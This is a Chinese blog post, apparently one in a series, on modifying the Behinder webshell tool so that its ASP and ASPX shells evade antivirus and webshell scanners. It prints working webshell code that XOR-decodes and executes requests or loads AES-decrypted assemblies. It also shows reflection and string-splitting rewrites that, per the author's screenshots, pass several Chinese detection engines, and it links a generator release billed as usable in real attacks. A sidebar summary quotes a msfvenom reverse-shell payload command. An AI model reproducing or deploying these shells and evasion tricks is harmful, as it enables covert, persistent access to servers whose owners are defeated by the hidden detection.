+<p>花一点点时间把模板写好，老样子，进行随机字符选取并且生成。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713223354412.png" alt="image-20250713223354412"></p>
+<p>这里如果你在生成木马的时候，没有写木马，默认为<code>bohemian</code>。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713224407939.png" alt="image-20250713224407939"></p>
+<p>生成三分，都不一样，ok。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713224443321.png" alt="image-20250713224443321"></p>
+<p>功能也都正常。再把404加上。</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250714001925736.png" alt="image-20250714001925736"><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250714001952066.png" alt="image-20250714001952066">ok。jsp就先到这里。下面免杀asp。</p>
+<h5 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h5><p>我们先来看下asp的木马，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">Response.CharSet = &quot;UTF-8&quot; </span><br><span class="line">k=&quot;e45e329feb5d925b&quot; &#x27;该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="line">Session(&quot;k&quot;)=k</span><br><span class="line">size=Request.TotalBytes</span><br><span class="line">content=Request.BinaryRead(size)</span><br><span class="line">For i=1 To size</span><br><span class="line">result=result&amp;Chr(ascb(midb(content，i，1)) Xor Asc(Mid(k，(i and 15)+1，1)))</span><br><span class="line">Next</span><br><span class="line">execute(result)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，很短，在asp中，加密就不在用aes了，而是用了xor，可能是调用aes不好调用了。我们来看下怎么免杀。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250714010004614.png" alt="image-20250714010004614"></p>
+<p>原版肯定被杀，这里xor需要改一下，还有就是execute需要改一下。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720101659191.png" alt="image-20250720101659191"></p>
+<p>经过笔者测试，result=result&amp;Chr(ascb(midb(content，i，1)) Xor Asc(Mid(k，(i and 15)+1，1)))这一句从新写一下就可过掉d盾。看看河马<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720101920447.png" alt="image-20250720101920447"></p>
+<p>河马本地的也是没有问题。在线的也没有问题。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720102029758.png" alt="image-20250720102029758"></p>
+<p>微步，也没啥问题，最近测试好像老是未知。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720105901614.png" alt="image-20250720105901614"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720105919523.png" alt="image-20250720105919523"></p>
+<p>我们花一点点时间封装一下，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110010668.png" alt="image-20250720110010668"></p>
+<p>整个模板，套一下，即可。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110101718.png" alt="image-20250720110101718"></p>
+<p>欧克。大家在使用的时候，如果传上去是500，不要慌，直接连接即可。正常使用。这个报错是没加try.不影响使用，因为没传递参数嘛.<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110256177.png" alt="image-20250720110256177"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110442638.png" alt="image-20250720110442638"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110525367.png" alt="image-20250720110525367"></p>
+<p>同时也可以看到，加了状态码。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720110555691.png" alt="image-20250720110555691"></p>
+<p>大家也可以看到这个asp的请求包和回显包都是乱码，这就是马中xor起的作用，有不可显字符嘛。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720111519445.png" alt="image-20250720111519445"></p>
+<p>好的，asp先到这里，接下看aspx</p>
+<h5 id="aspx"><a href="#aspx" class="headerlink" title="aspx"></a>aspx</h5><p>还是先来看下aspx的源码，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;，&quot;e45e329feb5d925b&quot;); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;)，c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k， k).TransformFinalBlock(c， 0， c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>也是很短。RijndaelManaged()  这里是创建aes加密，用获取到的key。那么我们就重点对这里做免杀。</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720112953875.png" alt="image-20250720112953875"></p>
+<p>先简单拆一下，可以看到单文件aspx，我们fuzz一下，看看哪里有问题，还是以前提到的，RijndaelManaged 换成AesManaged，这个加密函数替换一下，就可以了。<br>这里笔者在fuzz的时候发现是Assembly.Load，他是用来插件系统加载用户扩展 DLL，简单的来说就是加载内存的，似乎并没有什么其他的能替换掉，可以拆开，像下面这样反射加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string asmClass = &quot;System.&quot; + &quot;Reflection.&quot; + &quot;Assembly&quot;;</span><br><span class="line">string loadMethod = &quot;Lo&quot; + &quot;ad&quot;;</span><br><span class="line">var asmType = Type.GetType(asmClass);</span><br><span class="line">var asm = asmType.GetMethod(loadMethod， new Type[] &#123; typeof(byte[]) &#125;).Invoke(null， new object[] &#123; ccccc &#125;);</span><br><span class="line">((Assembly)asm).CreateInstance(&quot;U&quot;).Equals(this);</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720143532447.png" alt="image-20250720143532447"></p>
+<p>这样就把可以文件去掉了。<br>剩下这个单文件aspx了，这个我们在以前godzilla中，已经说到了，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720144344297.png" alt="image-20250720144344297"></p>
+<p>就是头部有这种<code>&lt;%@ Page Language=&quot;C#&quot; %&gt;``&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;</code>，这里处理是将&lt;%@ Page Language=”C#” %&gt;放到后面，也就是文件底部，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720144512576-17529939129321.png" alt="image-20250720144512576"></p>
+<p>那么其实还是会报单文件，这里就是还存在<code>&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;</code>，我只需将这个引入命名空间System.Reflection直接写到利用的地方即可，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145634926.png" alt="image-20250720145634926"></p>
+<p>这样就不用在上面定义了。也就可以过d盾了。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145702160.png" alt="image-20250720145702160"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145816947.png" alt="image-20250720145816947">本地河马没问题。在线河马也没问题<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720145947400.png" alt="image-20250720145947400"></p>
+<p>微步，只能说微步的gpt说的很对，当然给到gpt，我感觉都能分析出吧.<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720150239785.png" alt="image-20250720150239785"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720150329609.png" alt="image-20250720150329609"></p>
+<p>阿里云，aspx的我惊奇的发现，过掉了阿里云，在Godzilla中是没有过掉的，应该是吧字符串都拆开的原因.<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720150558999.png" alt="image-20250720150558999"></p>
+<p>好，这样免杀就做完了，360和火绒就不看了，没啥意思.<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720151459044.png" alt="image-20250720151459044"></p>
+<p>花一点点时间，封装一下，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155335012.png" alt="image-20250720155335012"></p>
+<p>好了，生成木马时记得写密码，不写的话就是bohemian。</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155618614-17529981803701.png" alt="image-20250720155618614"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155652802.png" alt="image-20250720155652802"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720155723593.png" alt="image-20250720155723593"></p>
+<p>使用起来也是没有任何问题。这样aspx的也就完成了。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>在界面添加了免杀生成的按钮，这样在找马的时候就不会手忙脚乱的了，直接生成即可。这里也算进行了简单的免杀，全部语言除了 aliyun没有过去，其他的平台基本全过，aspx的阿里云过去了。不得不承认，aliyun是强的。php 简单使用了一下类、对关键字进行了chr的替换，jsp重写了base64编码方法，重写了加载aes，使用的反射型方法写的，对关键字进行替换，asp使用了chr进行替换关键字拼接字符串，换了一下函数的写法，aspx对关键函数拆开重写，并且将关键查杀函数重新写了一下。</p>
+<h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装，<br>后面需要做的：修改一下加密方式，这样的话会更好一点。其他语言的 比如  jspx的 ，asmx的都没做，后面做。冰蝎4，是需要给到加密方式和解密方式的，我们想办法直接生成一个文件，里面包含免杀的木马，包含加解密方式，直接拿过来复制用即可，后面我们再来实现。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250720160341116.png" alt="image-20250720160341116"></p>
+<h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a target="_blank" rel="noopener" href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a><br>release 1.1 免杀版本，src代码也以上传，大家直接下载研究即可。<br>上个版本由于写的比较菜，没好意思跟大家要star，这次自我感觉还行，也算是实战能用了，如果感觉还凑合，大家帮忙点点star</p>
+<h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。如果您感觉文章写的不错或者工具用起来还行，帮笔者点点stars、给公众号点点关注，先谢谢大家了。</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebeyond/Behinder            原版behinder</span><br><span class="line">https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/                   webshell免杀研究jsp篇</span><br><span class="line">https://www.secpulse.com/archives/193780.html        简单操作实现冰蝎jsp webshell 阿里云免杀 </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>emmm 太菜了<br>一直在路上</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/">https://bohemian.top/2025/07/06/冰蝎二开v1-0/冰蝎二开从0到1-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E5%BC%80/">二开</a><a class="post-meta__tags" href="/tags/behinder/">behinder</a></div><div class="post-share"><div class="social-share" data-image="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1"><img class="cover" src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">冰蝎二开从0到1</div></div><div class="info-2"><div class="info-item-1">最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。 继上次二开哥斯拉后，已经过去了七个月了，项目收获了很多star，感谢大家。 上次我们已经对godzilla进行了二开，这次我们继续对冰蝎进行简单的二开。 准备工作首先致敬一下原版冰蝎，原版地址https://github.com/rebeyond/Behinder 我们这里使用的最新的[Behinder_v4.1【t00ls专版】...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1"><img class="cover" src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-19</div><div class="info-item-2">冰蝎二开从0到1</div></div><div class="info-2"><div class="info-item-1">最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。 继上次二开哥斯拉后，已经过去了七个月了，项目收获了很多star，感谢大家。 上次我们已经对godzilla进行了二开，这次我们继续对冰蝎进行简单的二开。 准备工作首先致敬一下原版冰蝎，原版地址https://github.com/rebeyond/Behinder 我们这里使用的最新的[Behinder_v4.1【t00ls专版】...</div></div></div></a><a class="pagination-related" href="/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/" title="sqlserver上线csormsf"><img class="cover" src="/images/my2021/xingkong.jpeg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-26</div><div class="info-item-2">sqlserver上线csormsf</div></div><div class="info-2"><div class="info-item-1">当我没拿到一个sqlserver的权限时，权限很小，且有waf的情况下，且只能透过web执行命令，上线到msf或者cs。  先看一下杀软  很多，还有国外的。 这里采用mshta免杀上线，参考文章https://www.zhihuifly.com/t/topic/2534 首先整个模板文件https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta，在这个里， 然后使用cs 或者msf生成一个raw 文件 msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.211.55.2 LPORT=3333 -f raw -o payload.bin cs  attacks  这里注意是32位的 然后cat payload.bin | base64 -w 0  把得到的内容写进模板里  然后起一个python服务器即可， msf的要起监听 use exploit/multi/handler payload...</div></div></div></a><a class="pagination-related" href="/2022/11/29/vulntarget-c/" title="vulntarget-c"><img class="cover" src="/images/vulntarget-e/image-20221129102253692.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-29</div><div class="info-item-2">vulntarget-c</div></div><div class="info-2"><div class="info-item-1">环境相关漏洞技术：laravel、OVAS-PHP相关漏洞、隧道代理、免杀、提权、CVE-2021-3129、CVE-2021-3493等下载地址：百度云链接:https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q提取码:...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ui%E7%BC%96%E5%86%99"><span class="toc-number">2.</span> <span class="toc-text">ui编写</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php"><span class="toc-number">3.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#jsp"><span class="toc-number">4.</span> <span class="toc-text">jsp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asp"><span class="toc-number">5.</span> <span class="toc-text">asp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#aspx"><span class="toc-number">6.</span> <span class="toc-text">aspx</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E4%B8%AA%E7%89%88%E6%9C%AC"><span class="toc-number">8.</span> <span class="toc-text">下个版本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E3%80%81%E4%BD%BF%E7%94%A8"><span class="toc-number">9.</span> <span class="toc-text">下载、使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number">10.</span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="冰蝎二开从0到1-2(免杀)"><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="冰蝎二开从0到1-2(免杀)"/></a><div class="content"><a class="title" href="/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="冰蝎二开从0到1-2(免杀)">冰蝎二开从0到1-2(免杀)</a><time datetime="2025-07-05T18:39:55.000Z" title="发表于 2025-07-06 02:39:55">2025-07-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1"><img src="/images/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20250706005428414.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="冰蝎二开从0到1"/></a><div class="content"><a class="title" href="/2025/06/19/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/" title="冰蝎二开从0到1">冰蝎二开从0到1</a><time datetime="2025-06-19T08:52:04.000Z" title="发表于 2025-06-19 16:52:04">2025-06-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
